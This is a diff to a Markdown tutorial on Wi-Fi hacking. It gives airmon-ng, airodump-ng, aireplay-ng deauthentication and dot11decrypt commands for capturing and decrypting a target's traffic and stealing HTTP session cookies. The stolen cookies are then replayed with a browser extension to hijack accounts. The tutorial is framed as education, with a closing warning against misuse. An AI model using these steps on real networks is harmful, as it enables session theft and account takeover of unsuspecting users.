@@ -189,18 +189,32 @@ If you wanna more detail, click this [link](https://www.aircrack-ng.org/document
 
 ### Basic: Open Netowrk
 
-1. Let's adapt USB into your computer.
+1. Let's adapt USB into your computer and change to Monitor Mode.
 2. Scan using Airodump-ng and get `BSSID(=MAC address)` of the targeted Access Point.
 ![9](./img/9.png?raw=true)
 
-3. Enter the BSSID in Wireshark and search packets to have HTTP Cookies of target.
+3. Select a WNIC and enter the BSSID in Wireshark.
+   - If you think that packets don't capture well, you can use Airmon-ng, which stop network-manager in Linux. If you can't access the Internet, it's a success.
+
+      ``` text
+      airmon-ng check kill
+      ```
+
+   - In addition, it needs to match the channel of the targeted Access Point. The channel is shown from Airodump-ng.
+
+      ``` text
+      airmon-ng start <interface> <channel>
+      ```
+
+4. Search packets to have HTTP Cookies of target.
+
 ![10](./img/10.png?raw=true)
 
-4. Move the target site and set cookies with a browser extension `EditThisCookie`.
+5. Move the target site and set cookies with a browser extension `EditThisCookie`.
    - i.e. copy & paste from the found packet to the site.
 ![11](./img/11.png?raw=true)
 
-5. What was going on is secret :p
+6. What was going on is secret :p
 
 ### Advanced: Encrypted Network
 
@@ -230,33 +244,64 @@ aireplay-ng <interface> --deauth <packet count> -a <AP MAC>
 
 ![13](./img/13.png?raw=true)
 
-After that, we can automatically perform decryption with [dot11decrypt](https://github.com/mfontanini/dot11decrypt). For then, we need to make `virtual WNIC` to get decrypted packets. There's a simple command below.
+After that, we can automatically perform decryption with [dot11decrypt](https://github.com/mfontanini/dot11decrypt), which takes all decrypted packets to a virtual adapter after catching EAPOL packets.
 
-```
-modprobe mac80211_hwsim
-```
-
-You won't get any packet if you observe this adapter with Airodump-ng. That's because this is a virtual adapter. Or you can check by sending a packet to that with `tcpreplay` in Linux.
-
-In attacker's computer with a USB adapter and a virtual adapter, one will monitor and another will wait decrypted packets from `dot11decrypt` after Deauthentication Attack.
-
-`dot11decrypt` take all decrypted packets to a virtual adapter after catching EAPOL packets.
-
-```
+``` text
 ./dot11decrypt <interface> wpa:<ssid>:<password>
 ```
 
 ![14](./img/14.png?raw=true)
 
-Summary
+dot11decrypt prints like the following.
 
-1. Let's adapt USB into your computer and change to Monitor Mode.
-2. Scan using Airodump-ng and get BSSID(=MAC address) of the targeted Access Point.
-3. Create a virtual adapter and observe it in Wireshark.
+``` bash
+Using device: tap0
+Device is up
+AP found: <SSID of target>: <MAC address of target>
+```
+
+Notice that `tap0` is the name of a virtual adapter, which dot11decrypt created. An attacker needs to just select `tap0` and watch in Wireshark.
+
+In attacker's computer with a USB adapter and a virtual adapter (=`tap0`), one will monitor and another will wait decrypted packets from dot11decrypt after Deauthentication Attack.
+
+**Summary**
+
+1. Let's adapt USB into your computer and change to [`Monitor Mode`]().
+
+2. Scan using Airodump-ng and get `BSSID(=MAC address)` of the targeted Access Point.
+
+    ``` text
+    airodump-ng <interface>
+    ```
+
+3. Select a WNIC and enter the BSSID in Wireshark.
+   - If you think that packets don't capture well, you can use Airmon-ng, which stop network-manager in Linux. If you can't access the Internet, it's a success.
+
+    ``` text
+    airmon-ng check kill
+    ```
+
+   - In addition, it needs to match the channel of the targeted Access Point. The channel is shown from Airodump-ng.
+
+    ``` text
+    airmon-ng start <interface> <channel>
+    ```
+
 4. Work the Deauthentication Attack to the target.
+
+    ``` text
+    aireplay-ng <interface> --deauth <packet count> -a <AP MAC>
+    ```
+
 5. Execute dot11decrypt.
+
+    ``` text
+    ./dot11decrypt <interface> wpa:<ssid>:<password>
+    ```
+
 6. Enter the BSSID in Wireshark and search packets to have HTTP Cookies of target.
 7. Move the target site and set cookies with a browser extension `EditThisCookie`.
+   - Notice that the network-manager should be on.
    - i.e. copy & paste from the found packet to the site.
 8. An attacker will get the account hijacking.
    - If you wonder about more detail, see the attached video.
@@ -275,10 +320,9 @@ The following is one case.
 
 - ![16](./img/16.png?raw=true)
 
+---
 ## Conclusion
 
 We looked at some hacking examples in a wireless network so far. Many people might think that WPA/WPA2 is secure since it has a password or so. But, the important thing we have to remember is that we should protect our data oneself on the Internet. This attitude is so much troublesome to someone, whereas treated as meaningful trivial things too.
 
 Lastly, please don't do that in any network.
-
----
